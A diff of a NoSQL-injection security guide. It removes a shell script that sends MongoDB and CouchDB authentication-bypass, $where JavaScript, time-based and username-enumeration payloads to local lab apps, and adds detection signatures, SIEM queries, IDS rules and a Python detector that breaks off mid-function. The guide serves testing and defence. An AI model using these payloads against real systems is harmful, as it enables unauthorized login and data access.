@@ -641,404 +641,784 @@ if __name__ == "__main__":
     main()
 ```
 
-## Shell Script Automation
+## Attack Detection and Monitoring
+
+### Wireshark Detection Signatures
+
+**Display Filter for NoSQL Injection Attempts:**
+
+```
+http contains "$ne" or
+http contains "$gt" or
+http contains "$lt" or
+http contains "$regex" or
+http contains "$where" or
+http contains "$exists" or
+http contains "$in" or
+http contains "$nin" or
+http contains "$or" or
+http contains "$and" or
+http.request.full_uri contains "%24ne" or
+http.request.full_uri contains "%24gt" or
+http.request.full_uri contains "%24where" or
+urlencoded-form.value contains "$ne" or
+urlencoded-form.value contains "$regex" or
+json.value.string contains "$where"
+```
+
+**Advanced NoSQL Injection Detection:**
+
+```
+# JavaScript injection in NoSQL queries
+http contains "function(" or http contains "sleep(" or http contains "this." or http contains "new Date"
+
+# MongoDB specific operators
+http contains "$size" or http contains "$type" or http contains "$mod" or http contains "$all"
+
+# CouchDB specific injection patterns
+http contains "_all_dbs" or http contains "_users" or http contains "startkey" or http contains "endkey"
+
+# Time-based NoSQL injection
+http.time > 5 and (http contains "sleep(" or http contains "while(" or http contains "Date()")
+```
+
+### Splunk Detection Queries
+
+**Basic NoSQL Injection Detection:**
+
+```spl
+index=web_logs
+| rex field=_raw "(?<nosql_operators>\$(?:ne|gt|lt|gte|lte|regex|where|exists|in|nin|or|and|not|all|size|type|mod))"
+| where isnotnull(nosql_operators)
+| eval injection_type=case(
+    match(nosql_operators, "\$where"), "JavaScript Injection",
+    match(nosql_operators, "\$regex"), "Regex Injection",
+    match(nosql_operators, "\$ne|\$gt|\$lt"), "Operator Injection",
+    match(nosql_operators, "\$exists|\$in|\$nin"), "Boolean Injection",
+    1=1, "Generic NoSQL"
+)
+| stats count by src_ip, dest_ip, uri_path, injection_type, nosql_operators
+| where count > 1
+| sort -count
+```
+
+**MongoDB Authentication Bypass Detection:**
+
+```spl
+index=web_logs
+| rex field=_raw "(?i)(?<auth_bypass>(\$ne.*null|\$gt.*\"\"|\$regex.*\.\*|\$exists.*true))"
+| where isnotnull(auth_bypass) AND (uri_path LIKE "%login%" OR uri_path LIKE "%auth%")
+| eval bypass_technique=case(
+    match(auth_bypass, "\$ne.*null"), "Not Equal Null Bypass",
+    match(auth_bypass, "\$gt.*\"\""), "Greater Than Empty Bypass",
+    match(auth_bypass, "\$regex.*\.\*"), "Regex Wildcard Bypass",
+    match(auth_bypass, "\$exists.*true"), "Exists Check Bypass",
+    1=1, "Unknown Bypass"
+)
+| stats count, values(user_agent) as user_agents by src_ip, bypass_technique
+| sort -count
+```
+
+**NoSQL JavaScript Injection Analytics:**
+
+```spl
+index=web_logs
+| rex field=_raw "(?i)(?<js_injection>(function\s*\(|sleep\s*\(|this\.|new\s+Date|while\s*\(|eval\s*\())"
+| where isnotnull(js_injection)
+| eval js_risk=case(
+    match(js_injection, "sleep\s*\("), 7,
+    match(js_injection, "eval\s*\("), 9,
+    match(js_injection, "function\s*\("), 6,
+    match(js_injection, "while\s*\("), 8,
+    1=1, 5
+)
+| eval risk_level=case(
+    js_risk >= 8, "Critical",
+    js_risk >= 6, "High",
+    js_risk >= 4, "Medium",
+    1=1, "Low"
+)
+| stats count, max(js_risk) as max_risk by src_ip, risk_level, uri_path
+| sort -max_risk
+```
+
+**Time-based NoSQL Injection Detection:**
+
+```spl
+index=web_logs
+| where response_time > 5000
+| rex field=_raw "(?i)(?<time_injection>(sleep\s*\(|while.*Date|benchmark))"
+| where isnotnull(time_injection)
+| eval response_time_sec=response_time/1000
+| stats avg(response_time_sec) as avg_response, count by src_ip, time_injection, uri_path
+| where avg_response > 3
+| sort -avg_response
+```
+
+### SIEM Integration
+
+**QRadar AQL Query:**
+
+```sql
+SELECT
+    sourceip,
+    destinationip,
+    "URL" as url,
+    payload,
+    eventcount,
+    CASE
+        WHEN payload ILIKE '%$where%' THEN 'JavaScript NoSQL Injection'
+        WHEN payload ILIKE '%$ne%null%' THEN 'Authentication Bypass'
+        WHEN payload ILIKE '%$regex%' THEN 'Regex NoSQL Injection'
+        WHEN payload ILIKE '%$gt%$lt%' THEN 'Range Query Injection'
+        ELSE 'Generic NoSQL Injection'
+    END as injection_type
+FROM events
+WHERE
+    devicetype = 12 AND
+    (payload ILIKE '%$ne%' OR
+     payload ILIKE '%$gt%' OR
+     payload ILIKE '%$regex%' OR
+     payload ILIKE '%$where%' OR
+     payload ILIKE '%$exists%' OR
+     payload ILIKE '%$in%' OR
+     payload ILIKE '%$nin%')
+    AND eventtime > NOW() - INTERVAL '1 HOUR'
+ORDER BY eventtime DESC
+LIMIT 100
+```
+
+**Elastic Stack Detection Rule:**
+
+```json
+{
+  "query": {
+    "bool": {
+      "should": [
+        {
+          "regexp": {
+            "http.request.body.content": ".*\\$(?:ne|gt|lt|regex|where|exists|in|nin).*"
+          }
+        },
+        {
+          "regexp": {
+            "url.query": ".*\\$(?:ne|gt|lt|regex|where|exists).*"
+          }
+        },
+        {
+          "match_phrase": {
+            "http.request.body.content": "function("
+          }
+        },
+        {
+          "regexp": {
+            "http.request.body.content": ".*(sleep\\(|this\\.|new Date).*"
+          }
+        }
+      ],
+      "minimum_should_match": 1,
+      "filter": [
+        {
+          "range": {
+            "@timestamp": {
+              "gte": "now-1h"
+            }
+          }
+        }
+      ]
+    }
+  }
+}
+```
+
+### Network Security Monitoring
+
+**Suricata Rules:**
 
 ```bash
-#!/bin/zsh
-# NoSQL Injection Testing Automation Script
-# Comprehensive testing for MongoDB and other NoSQL databases
+# Basic NoSQL injection detection
+alert http any any -> any any (msg:"NoSQL Injection - MongoDB Operators"; content:"$ne"; nocase; sid:2001; rev:1;)
 
-set -e
+alert http any any -> any any (msg:"NoSQL Injection - Regex Attack"; content:"$regex"; nocase; sid:2002; rev:1;)
 
-# Color codes for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+alert http any any -> any any (msg:"NoSQL Injection - JavaScript Where Clause"; content:"$where"; nocase; sid:2003; rev:1;)
 
-# Configuration
-JUICE_SHOP_URL="http://localhost:3000"
-DVWA_URL="http://localhost/dvwa"
-WEBGOAT_URL="http://localhost:8080/WebGoat"
-COUCHDB_URL="http://localhost:5984"
+alert http any any -> any any (msg:"NoSQL Injection - Authentication Bypass"; content:"$ne"; nocase; content:"null"; distance:0; within:10; sid:2004; rev:1;)
 
-# Results directory
-RESULTS_DIR="nosql_injection_results_$(date +%Y%m%d_%H%M%S)"
-mkdir -p "$RESULTS_DIR"
+alert http any any -> any any (msg:"NoSQL Injection - Boolean Operators"; content:"$exists"; nocase; sid:2005; rev:1;)
 
-echo -e "${BLUE}Starting NoSQL Injection Testing Suite${NC}"
-echo "Results will be saved to: $RESULTS_DIR"
+# Advanced NoSQL injection patterns
+alert http any any -> any any (msg:"NoSQL Injection - Time-based Attack"; content:"sleep("; nocase; sid:2006; rev:1;)
 
-# Function to test MongoDB authentication bypass
-test_mongodb_auth_bypass() {
-    local login_url=$1
+alert http any any -> any any (msg:"NoSQL Injection - JavaScript Function"; content:"function("; nocase; sid:2007; rev:1;)
 
-    echo -e "${YELLOW}Testing MongoDB authentication bypass${NC}"
+alert http any any -> any any (msg:"NoSQL Injection - CouchDB Attack"; content:"_all_dbs"; nocase; sid:2008; rev:1;)
 
-    # Authentication bypass payloads
-    local payloads=(
-        '{"email": {"$ne": null}, "password": {"$ne": null}}'
-        '{"email": {"$ne": ""}, "password": {"$ne": ""}}'
-        '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
-        '{"email": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
-        '{"email": {"$exists": true}, "password": {"$exists": true}}'
-        '{"email": {"$where": "1==1"}, "password": {"$where": "1==1"}}'
-        '{"email": {"$nin": [""]}, "password": {"$nin": [""]}}'
-    )
-
-    for payload in "${payloads[@]}"; do
-        echo "Testing payload: $payload"
-
-        response=$(curl -s -w "%{http_code}" -X POST "$login_url" \
-            -H "Content-Type: application/json" \
-            -d "$payload" \
-            -o "$RESULTS_DIR/auth_response_$(date +%s).json")
-
-        if [[ "$response" == "200" ]]; then
-            # Check if response contains authentication success indicators
-            if grep -qi -E "(token|welcome|dashboard|authentication.*success)" \
-               "$RESULTS_DIR/auth_response_$(date +%s).json" 2>/dev/null; then
-                echo -e "${RED}[VULNERABLE] Authentication bypass successful!${NC}"
-                echo "$login_url - Auth bypass: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-            fi
-        elif [[ "$response" == "500" ]]; then
-            echo -e "${YELLOW}[POTENTIAL] Server error - possible injection${NC}"
-            echo "$login_url - Server error: $payload" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
-        else
-            echo -e "${GREEN}[SAFE] No bypass detected (HTTP $response)${NC}"
-        fi
-
-        sleep 0.5
-    done
-}
-
-# Function to test NoSQL operator injection
-test_nosql_operators() {
-    local base_url=$1
-
-    echo -e "${YELLOW}Testing NoSQL operator injection${NC}"
-
-    # Test endpoints
-    local endpoints=(
-        "/api/users"
-        "/api/products"
-        "/rest/products/search"
-        "/api/search"
-    )
-
-    # Operator payloads
-    local operators=(
-        "id[\$ne]=null"
-        "username[\$regex]=^admin"
-        "price[\$gt]=0"
-        "price[\$lt]=9999"
-        "category[\$in][]=electronics"
-        "status[\$nin][]=deleted"
-        "created[\$exists]=true"
-        "reviews[\$size]=5"
-    )
-
-    for endpoint in "${endpoints[@]}"; do
-        local url="$base_url$endpoint"
-
-        # Check if endpoint exists
-        if ! curl -s "$url" > /dev/null 2>&1; then
-            continue
-        fi
-
-        echo "Testing endpoint: $endpoint"
-
-        for operator in "${operators[@]}"; do
-            echo "  Testing operator: $operator"
-
-            response=$(curl -s -w "%{http_code}" "$url?$operator" \
-                -o "$RESULTS_DIR/operator_response_$(echo $operator | tr '[]$/' '_').json")
-
-            if [[ "$response" == "200" ]]; then
-                # Check if response contains data indicating successful injection
-                if grep -qi -E '(\[.*\]|\{.*".*":)' \
-                   "$RESULTS_DIR/operator_response_$(echo $operator | tr '[]$/' '_').json" 2>/dev/null; then
-                    echo -e "${RED}[VULNERABLE] Operator injection successful!${NC}"
-                    echo "$url - Operator: $operator" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-                fi
-            elif [[ "$response" == "500" ]]; then
-                echo -e "${YELLOW}[POTENTIAL] Server error with operator${NC}"
-                echo "$url - Error with: $operator" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
-            fi
-
-            sleep 0.3
-        done
-    done
-}
-
-# Function to test JavaScript injection
-test_javascript_injection() {
-    local search_url=$1
-
-    echo -e "${YELLOW}Testing JavaScript injection in NoSQL queries${NC}"
-
-    # JavaScript injection payloads
-    local js_payloads=(
-        '{"query": {"$where": "this.username == \"admin\" || \"1\" == \"1\""}}'
-        '{"query": {"$where": "function() { return this.price > 0 || true; }"}}'
-        '{"query": {"$where": "this.id > 0 || true"}}'
-        '{"query": {"$where": "this.username.match(/admin/)"}}'
-        '{"query": {"$where": "Object.keys(this).length > 0"}}'
-        '{"query": {"$where": "JSON.stringify(this).indexOf(\"admin\") >= 0"}}'
-    )
-
-    for payload in "${js_payloads[@]}"; do
-        echo "Testing JS payload: $payload"
-
-        response=$(curl -s -w "%{http_code}" -X POST "$search_url" \
-            -H "Content-Type: application/json" \
-            -d "$payload" \
-            -o "$RESULTS_DIR/js_response_$(date +%s).json")
-
-        if [[ "$response" == "200" ]]; then
-            # Check if response contains data
-            if grep -qi -E '(\[.*\]|\{.*".*":)' \
-               "$RESULTS_DIR/js_response_$(date +%s).json" 2>/dev/null; then
-                echo -e "${RED}[VULNERABLE] JavaScript injection successful!${NC}"
-                echo "$search_url - JS injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-            fi
-        elif [[ "$response" == "500" ]]; then
-            echo -e "${YELLOW}[POTENTIAL] Server error - possible JS injection${NC}"
-            echo "$search_url - JS error: $payload" >> "$RESULTS_DIR/potential_vulnerabilities.txt"
-        fi
-
-        sleep 0.5
-    done
-}
-
-# Function to test time-based NoSQL injection
-test_time_based_injection() {
-    local search_url=$1
-
-    echo -e "${YELLOW}Testing time-based NoSQL injection${NC}"
-
-    # Time-based payloads
-    local time_payloads=(
-        '{"query": {"$where": "sleep(5000) || true"}}'
-        '{"query": {"$where": "function() { var start = new Date(); while (new Date() - start < 5000); return true; }"}}'
-    )
-
-    for payload in "${time_payloads[@]}"; do
-        echo "Testing time-based payload: $payload"
-
-        start_time=$(date +%s)
-
-        response=$(curl -s -w "%{http_code}" -X POST "$search_url" \
-            -H "Content-Type: application/json" \
-            -d "$payload" \
-            -m 10 \
-            -o "$RESULTS_DIR/time_response_$(date +%s).json")
-
-        end_time=$(date +%s)
-        duration=$((end_time - start_time))
-
-        if [[ $duration -ge 4 ]]; then
-            echo -e "${RED}[VULNERABLE] Time-based injection detected! Response time: ${duration}s${NC}"
-            echo "$search_url - Time-based injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-        else
-            echo -e "${GREEN}[SAFE] Normal response time: ${duration}s${NC}"
-        fi
-
-        sleep 1
-    done
-}
-
-# Function to test blind NoSQL injection
-test_blind_injection() {
-    local login_url=$1
-
-    echo -e "${YELLOW}Testing blind NoSQL injection for username enumeration${NC}"
-
-    # Common usernames to test
-    local usernames=("admin" "user" "test" "guest" "root")
-
-    for username in "${usernames[@]}"; do
-        echo "Testing username: $username"
-
-        # Test if username exists using regex
-        local regex_payload="{\"email\": {\"\\$regex\": \"^$username\"}, \"password\": {\"\\$ne\": null}}"
-
-        response=$(curl -s -w "%{http_code}" -X POST "$login_url" \
-            -H "Content-Type: application/json" \
-            -d "$regex_payload" \
-            -o "$RESULTS_DIR/blind_response_$username.json")
-
-        if [[ "$response" == "401" ]]; then
-            echo -e "${YELLOW}[INFO] Username '$username' exists (unauthorized)${NC}"
-            echo "$login_url - Valid username: $username" >> "$RESULTS_DIR/discovered_usernames.txt"
-        elif [[ "$response" == "200" ]]; then
-            echo -e "${RED}[VULNERABLE] Authentication bypass for username: $username${NC}"
-            echo "$login_url - Auth bypass username: $username" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-        fi
-
-        sleep 0.5
-    done
-}
-
-# Function to test CouchDB injection
-test_couchdb_injection() {
-    local couchdb_url=$1
-
-    echo -e "${YELLOW}Testing CouchDB injection techniques${NC}"
-
-    # CouchDB endpoints to test
-    local endpoints=(
-        "/_all_dbs"
-        "/_users/_all_docs"
-        "/_config"
-        "/_stats"
-    )
-
-    for endpoint in "${endpoints[@]}"; do
-        local url="$couchdb_url$endpoint"
-
-        echo "Testing CouchDB endpoint: $endpoint"
-
-        response=$(curl -s -w "%{http_code}" "$url" \
-            -o "$RESULTS_DIR/couchdb_response_$(echo $endpoint | tr '/' '_').json")
-
-        if [[ "$response" == "200" ]]; then
-            echo -e "${RED}[ACCESSIBLE] CouchDB endpoint accessible: $endpoint${NC}"
-            echo "$url - Accessible CouchDB endpoint" >> "$RESULTS_DIR/accessible_endpoints.txt"
-        elif [[ "$response" == "401" ]]; then
-            echo -e "${YELLOW}[INFO] CouchDB endpoint requires authentication: $endpoint${NC}"
-        else
-            echo -e "${GREEN}[SAFE] CouchDB endpoint not accessible: $endpoint (HTTP $response)${NC}"
-        fi
-
-        sleep 0.3
-    done
-
-    # Test CouchDB view injection
-    echo "Testing CouchDB view injection..."
-
-    local view_payloads=(
-        'startkey="\"&endkey="{}"'
-        'key={"$gt":null}'
-        'keys=["admin",{}]'
-    )
-
-    for payload in "${view_payloads[@]}"; do
-        local url="$couchdb_url/_users/_all_docs?$payload"
-
-        response=$(curl -s -w "%{http_code}" "$url" \
-            -o "$RESULTS_DIR/couchdb_view_$(echo $payload | tr '{}[]"$' '_').json")
-
-        if [[ "$response" == "200" ]]; then
-            echo -e "${RED}[VULNERABLE] CouchDB view injection successful!${NC}"
-            echo "$url - View injection: $payload" >> "$RESULTS_DIR/vulnerable_endpoints.txt"
-        fi
-
-        sleep 0.5
-    done
-}
-
-# Main testing function
-main() {
-    echo -e "${BLUE}NoSQL Injection Testing Suite Started${NC}"
-    echo "Timestamp: $(date)"
-    echo "Results directory: $RESULTS_DIR"
-
-    # Test OWASP Juice Shop
-    if curl -s "$JUICE_SHOP_URL" > /dev/null 2>&1; then
-        echo -e "\n${BLUE}Testing OWASP Juice Shop${NC}"
-        test_mongodb_auth_bypass "$JUICE_SHOP_URL/rest/user/login"
-        test_nosql_operators "$JUICE_SHOP_URL"
-        test_javascript_injection "$JUICE_SHOP_URL/api/search"
-        test_time_based_injection "$JUICE_SHOP_URL/api/search"
-        test_blind_injection "$JUICE_SHOP_URL/rest/user/login"
-    else
-        echo -e "${YELLOW}OWASP Juice Shop not accessible at $JUICE_SHOP_URL${NC}"
-    fi
-
-    # Test CouchDB if available
-    if curl -s "$COUCHDB_URL" > /dev/null 2>&1; then
-        echo -e "\n${BLUE}Testing CouchDB${NC}"
-        test_couchdb_injection "$COUCHDB_URL"
-    else
-        echo -e "${YELLOW}CouchDB not accessible at $COUCHDB_URL${NC}"
-    fi
-
-    # Generate summary report
-    echo -e "\n${BLUE}Generating Summary Report${NC}"
-
-    if [[ -f "$RESULTS_DIR/vulnerable_endpoints.txt" ]]; then
-        vulnerable_count=$(wc -l < "$RESULTS_DIR/vulnerable_endpoints.txt")
-        echo -e "${RED}Vulnerable endpoints found: $vulnerable_count${NC}"
-        echo "Vulnerable endpoints:"
-        cat "$RESULTS_DIR/vulnerable_endpoints.txt"
-    else
-        echo -e "${GREEN}No confirmed NoSQL injection vulnerabilities found${NC}"
-    fi
-
-    if [[ -f "$RESULTS_DIR/potential_vulnerabilities.txt" ]]; then
-        potential_count=$(wc -l < "$RESULTS_DIR/potential_vulnerabilities.txt")
-        echo -e "${YELLOW}Potential vulnerabilities: $potential_count${NC}"
-        echo "Potential vulnerabilities:"
-        cat "$RESULTS_DIR/potential_vulnerabilities.txt"
-    fi
-
-    if [[ -f "$RESULTS_DIR/discovered_usernames.txt" ]]; then
-        username_count=$(wc -l < "$RESULTS_DIR/discovered_usernames.txt")
-        echo -e "${YELLOW}Discovered usernames: $username_count${NC}"
-        echo "Discovered usernames:"
-        cat "$RESULTS_DIR/discovered_usernames.txt"
-    fi
-
-    if [[ -f "$RESULTS_DIR/accessible_endpoints.txt" ]]; then
-        accessible_count=$(wc -l < "$RESULTS_DIR/accessible_endpoints.txt")
-        echo -e "${YELLOW}Accessible endpoints: $accessible_count${NC}"
-        echo "Accessible endpoints:"
-        cat "$RESULTS_DIR/accessible_endpoints.txt"
-    fi
-
-    echo -e "\n${BLUE}Testing complete. Results saved to: $RESULTS_DIR${NC}"
-    echo "Key files:"
-    echo "- vulnerable_endpoints.txt: Confirmed NoSQL injection vulnerabilities"
-    echo "- potential_vulnerabilities.txt: Potential issues requiring manual review"
-    echo "- discovered_usernames.txt: Valid usernames discovered through blind injection"
-    echo "- accessible_endpoints.txt: Accessible database endpoints"
-    echo "- *_response_*.json: HTTP response captures"
-}
-
-# Check dependencies
-check_dependencies() {
-    echo "Checking dependencies..."
-
-    if ! command -v curl >/dev/null 2>&1; then
-        echo -e "${RED}Error: curl is required but not installed${NC}"
-        exit 1
-    fi
-
-    if ! command -v jq >/dev/null 2>&1; then
-        echo -e "${YELLOW}Warning: jq not found. Install with: brew install jq${NC}"
-    fi
-
-    echo -e "${GREEN}Dependencies check complete${NC}"
-}
-
-# Cleanup function
-cleanup() {
-    echo -e "\n${YELLOW}Cleaning up temporary files...${NC}"
-    # Remove any temporary files if needed
-    echo -e "${GREEN}Cleanup complete${NC}"
-}
-
-# Set trap for cleanup
-trap cleanup EXIT
-
-# Run dependency check and main function
-check_dependencies
-main
-
-echo -e "\n${GREEN}NoSQL injection testing suite completed successfully!${NC}"
+alert http any any -> any any (msg:"NoSQL Injection - Array Operators"; content:"$in"; nocase; content:"$nin"; nocase; distance:0; within:50; sid:2009; rev:1;)
 ```
+
+**Snort Rules:**
+
+```bash
+alert tcp any any -> any [80,443,8080,8443] (msg:"NoSQL Injection MongoDB Operator"; flow:established,to_server; content:"$ne"; nocase; classtype:web-application-attack; sid:2000001; rev:1;)
+
+alert tcp any any -> any [80,443,8080,8443] (msg:"NoSQL Injection Where Clause"; flow:established,to_server; content:"$where"; nocase; classtype:web-application-attack; sid:2000002; rev:1;)
+
+alert tcp any any -> any [80,443,8080,8443] (msg:"NoSQL Injection Regex Attack"; flow:established,to_server; content:"$regex"; nocase; classtype:web-application-attack; sid:2000003; rev:1;)
+```
+
+### Log Analysis Scripts
+
+**MongoDB Log Analysis (Bash):**
+
+```bash
+#!/bin/bash
+
+LOG_FILE="/var/log/mongodb/mongod.log"
+ALERT_THRESHOLD=5
+OUTPUT_FILE="/tmp/nosql_detection_$(date +%Y%m%d_%H%M%S).txt"
+
+echo "NoSQL Injection Detection Analysis - $(date)" > "$OUTPUT_FILE"
+echo "=============================================" >> "$OUTPUT_FILE"
+
+# Detect NoSQL operator injection
+echo -e "\n[+] NoSQL Operator Injection Attempts:" >> "$OUTPUT_FILE"
+grep -E "\$ne|\$gt|\$lt|\$regex|\$where|\$exists" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+# Detect JavaScript injection in MongoDB
+echo -e "\n[+] JavaScript Injection Attempts:" >> "$OUTPUT_FILE"
+grep -E "function\(|sleep\(|this\.|eval\(" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+# Detect authentication bypass attempts
+echo -e "\n[+] Authentication Bypass Attempts:" >> "$OUTPUT_FILE"
+grep -E "\$ne.*null|\$gt.*\"\"|\$regex.*\.\*" "$LOG_FILE" | tail -20 >> "$OUTPUT_FILE"
+
+# Check for suspicious query patterns
+echo -e "\n[+] Suspicious Query Patterns:" >> "$OUTPUT_FILE"
+grep -E "planSummary.*COLLSCAN" "$LOG_FILE" | wc -l >> "$OUTPUT_FILE"
+
+echo "Analysis complete. Results saved to: $OUTPUT_FILE"
+```
+
+**Application Log Analysis (PowerShell):**
+
+```powershell
+param(
+    [string]$LogPath = "C:\logs\application\",
+    [int]$Hours = 24
+)
+
+$StartTime = (Get-Date).AddHours(-$Hours)
+$OutputFile = "NoSQL_Detection_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+
+"NoSQL Injection Detection Analysis - $(Get-Date)" | Out-File $OutputFile
+"=============================================" | Out-File $OutputFile -Append
+
+# Get recent log files
+$LogFiles = Get-ChildItem $LogPath -Filter "*.log" | Where-Object {$_.LastWriteTime -gt $StartTime}
+
+foreach ($LogFile in $LogFiles) {
+    $Content = Get-Content $LogFile.FullName
+
+    # NoSQL operator attacks
+    $OperatorAttacks = $Content | Select-String -Pattern "\$(?:ne|gt|lt|regex|where|exists)" -AllMatches
+    if ($OperatorAttacks) {
+        "`n[+] NoSQL Operator Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
+        $OperatorAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
+    }
+
+    # JavaScript injection
+    $JSAttacks = $Content | Select-String -Pattern "(function\(|sleep\(|this\.|eval\()" -AllMatches
+    if ($JSAttacks) {
+        "`n[+] JavaScript Injection in $($LogFile.Name):" | Out-File $OutputFile -Append
+        $JSAttacks | Select-Object -First 10 | Out-File $OutputFile -Append
+    }
+
+    # Authentication bypass
+    $AuthBypass = $Content | Select-String -Pattern "(\$ne.*null|\$gt.*\"\")" -AllMatches
+    if ($AuthBypass) {
+        "`n[+] Authentication Bypass in $($LogFile.Name):" | Out-File $OutputFile -Append
+        $AuthBypass | Select-Object -First 10 | Out-File $OutputFile -Append
+    }
+}
+
+Write-Host "Analysis complete. Results saved to: $OutputFile"
+```
+
+### Python Behavioral Detection Script
+
+```python
+#!/usr/bin/env python3
+"""
+NoSQL Injection Attack Detection and Analysis System
+Real-time monitoring for MongoDB, CouchDB, and other NoSQL databases
+"""
+
+import re
+import json
+import time
+import sqlite3
+import hashlib
+from datetime import datetime, timedelta
+from collections import defaultdict, Counter
+from urllib.parse import unquote
+import logging
+
+class NoSQLInjectionDetector:
+    def __init__(self, db_path="nosql_detection.db"):
+        self.db_path = db_path
+        self.setup_database()
+        self.setup_logging()
+
+        # NoSQL injection patterns
+        self.patterns = {
+            'mongodb_operators': [
+                r'\$ne\b',
+                r'\$gt\b',
+                r'\$lt\b',
+                r'\$gte\b',
+                r'\$lte\b',
+                r'\$regex\b',
+                r'\$where\b',
+                r'\$exists\b',
+                r'\$in\b',
+                r'\$nin\b',
+                r'\$or\b',
+                r'\$and\b',
+                r'\$not\b',
+                r'\$size\b',
+                r'\$type\b',
+                r'\$mod\b',
+                r'\$all\b'
+            ],
+            'javascript_injection': [
+                r'function\s*\(',
+                r'sleep\s*\(',
+                r'this\.',
+                r'new\s+Date',
+                r'while\s*\(',
+                r'for\s*\(',
+                r'eval\s*\(',
+                r'setTimeout\s*\(',
+                r'setInterval\s*\('
+            ],
+            'auth_bypass': [
+                r'\$ne.*null',
+                r'\$gt.*""',
+                r'\$regex.*\.\*',
+                r'\$exists.*true',
+                r'\$nin.*\[\]'
+            ],
+            'couchdb_injection': [
+                r'_all_dbs',
+                r'_users',
+                r'_config',
+                r'_stats',
+                r'startkey.*endkey',
+                r'reduce=false'
+            ],
+            'time_based': [
+                r'sleep\s*\(\s*\d+',
+                r'while.*Date.*getTime',
+                r'setTimeout.*\d+',
+                r'new\s+Date.*while'
+            ]
+        }
+
+        # Detection thresholds
+        self.thresholds = {
+            'operators_per_request': 3,
+            'requests_per_minute': 15,
+            'unique_operators_per_ip': 8,
+            'time_window': 300,  # 5 minutes
+            'response_time_threshold': 3.0  # seconds
+        }
+
+        # Tracking data
+        self.ip_activity = defaultdict(list)
+        self.operator_usage = defaultdict(list)
+
+    def setup_database(self):
+        """Initialize SQLite database for tracking"""
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS nosql_attempts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp TEXT,
+                source_ip TEXT,
+                target_url TEXT,
+                payload TEXT,
+                injection_type TEXT,
+                operators_used TEXT,
+                risk_score INTEGER,
+                response_time REAL,
+                blocked BOOLEAN
+            )
+        ''')
+
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS operator_stats (
+                operator TEXT PRIMARY KEY,
+                usage_count INTEGER,
+                last_seen TEXT,
+                associated_ips TEXT
+            )
+        ''')
+
+        conn.commit()
+        conn.close()
+
+    def setup_logging(self):
+        """Configure logging"""
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler('nosql_detector.log'),
+                logging.StreamHandler()
+            ]
+        )
+        self.logger = logging.getLogger(__name__)
+
+    def analyze_request(self, request_data):
+        """
+        Analyze HTTP request for NoSQL injection patterns
+
+        Args:
+            request_data (dict): Contains 'ip', 'url', 'params', 'body', 'headers', 'response_time'
+
+        Returns:
+            dict: Analysis results
+        """
+        source_ip = request_data.get('ip')
+        url = request_data.get('url', '')
+        params = request_data.get('params', {})
+        body = request_data.get('body', '')
+        response_time = request_data.get('response_time', 0)
+
+        # Combine all input data
+        combined_input = f"{url} {json.dumps(params)} {body}"
+        decoded_input = unquote(combined_input)
+
+        detection_results = {
+            'timestamp': datetime.now().isoformat(),
+            'source_ip': source_ip,
+            'target_url': url,
+            'detected_patterns': [],
+            'injection_types': [],
+            'operators_used': [],
+            'risk_score': 0,
+            'response_time': response_time,
+            'should_block': False
+        }
+
+        # Pattern matching
+        for injection_type, patterns in self.patterns.items():
+            for pattern in patterns:
+                matches = re.finditer(pattern, decoded_input, re.IGNORECASE)
+                for match in matches:
+                    detection_results['detected_patterns'].append({
+                        'type': injection_type,
+                        'pattern': pattern,
+                        'match': match.group(),
+                        'position': match.span()
+                    })
+
+                    if injection_type not in detection_results['injection_types']:
+                        detection_results['injection_types'].append(injection_type)
+
+                    if injection_type == 'mongodb_operators':
+                        operator = match.group()
+                        if operator not in detection_results['operators_used']:
+                            detection_results['operators_used'].append(operator)
+
+        # Calculate risk score
+        detection_results['risk_score'] = self.calculate_risk_score(detection_results)
+
+        # Behavioral analysis
+        if detection_results['detected_patterns']:
+            self.update_behavioral_tracking(source_ip, detection_results)
+            detection_results['should_block'] = self.should_block_ip(source_ip)
+
+            # Log to database
+            self.log_attempt(detection_results, combined_input)
+
+        return detection_results
+
+    def calculate_risk_score(self, detection_results):
+        """Calculate risk score based on detected patterns"""
+        score = 0
+        type_scores = {
+            'mongodb_operators': 6,
+            'javascript_injection': 9,
+            'auth_bypass': 8,
+            'couchdb_injection': 7,
+            'time_based': 10
+        }
+
+        for pattern_data in detection_results['detected_patterns']:
+            injection_type = pattern_data['type']
+            score += type_scores.get(injection_type, 5)
+
+        # Bonus for multiple operators
+        operator_count = len(detection_results['operators_used'])
+        if operator_count > self.thresholds['operators_per_request']:
+            score += operator_count * 2
+
+        # Bonus for multiple injection types
+        if len(detection_results['injection_types']) > 1:
+            score += len(detection_results['injection_types']) * 3
+
+        # Time-based detection bonus
+        if detection_results['response_time'] > self.thresholds['response_time_threshold']:
+            score += 5
+
+        return min(score, 100)  # Cap at 100
+
+    def update_behavioral_tracking(self, source_ip, detection_results):
+        """Update behavioral tracking for IP address"""
+        current_time = datetime.now()
+
+        # Clean old entries
+        cutoff_time = current_time - timedelta(seconds=self.thresholds['time_window'])
+        self.ip_activity[source_ip] = [
+            attempt for attempt in self.ip_activity[source_ip]
+            if attempt['timestamp'] > cutoff_time
+        ]
+
+        # Add new attempt
+        self.ip_activity[source_ip].append({
+            'timestamp': current_time,
+            'risk_score': detection_results['risk_score'],
+            'injection_types': detection_results['injection_types'],
+            'operators_used': detection_results['operators_used']
